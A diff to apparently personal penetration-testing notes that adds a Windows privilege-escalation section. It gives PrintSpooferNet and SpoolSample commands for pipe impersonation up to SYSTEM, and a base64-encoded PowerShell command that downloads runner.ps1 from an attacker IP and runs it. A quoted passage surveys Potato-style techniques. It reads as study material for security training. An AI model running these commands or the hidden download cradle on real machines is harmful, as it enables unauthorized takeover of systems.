@@ -70,8 +70,31 @@ Parses through ExtendedRights for each AD computer with LAPS enabled and looks f
 
 <br><br>
 
-### Access Tokens  
+# Access Tokens  
 
 **the operating system also must keep track of the user's access rights, i.e. authorization. Windows uses access tokens to track these rights**  
 
+
+
+### PrintSpooferNet and SpoolSample to go from NT Authority\* to SYSTEM.  Local privilege escalation
+
+On Kali as PrintSpooferNet and SpoolSample under visualStudio folder  
+
+AS 'NT Authority':
+
+1) PrintSpooferNet.exe \\.\pipe\test\pipe\spoolss
+
+ALSO AS 'NT AUTHORITY'
+
+2) SpoolSample.exe appsrv01 appsrv01/pipe/test
+
+
+<Br>CMD.exe will be spawned (you can make any executable in the last line of the source code for printspoofernet) as SYSTEM.  Enjoy priv esc.  <br>
+**"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -encodedCommand KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADQANQAuADEAOAA1AC8AcgB1AG4AbgBlAHIALgBwAHMAMQAnACkAIAB8ACAAaQBlAHgA"**  <br>
+
+
+>The technique shown in this section is not the only possible way of leveraging impersonation to obtain SYSTEM integrity. A similar technique that also uses pipes has been discovered by Alex Ionescu and Yarden Shafir. It impersonates the RPC system service (RpcSs), which typically contains SYSTEM tokens that can be stolen. Note that this technique only works for Network Service. <br><br>On older versions of Windows 10 and Windows Server 2016, the Juicy Potato tool obtains SYSTEM integrity through a local man-in-the-middle attack through COM. It is blocked on Windows 10 version 1809 and newer along with Windows Server 2019, which inspired the release of the RoguePotato tool, expanding this technique to provide access to the RpcSs service and subsequently SYSTEM integrity access.<br><br>Lastly, the beans technique based on local man-in-the-middle authentication with Windows Remote Management (WinRM) also yields SYSTEM integrity access. The caveat of this technique is that it only works on Windows clients, not servers, by default.  
+
+
+<br><br>
 
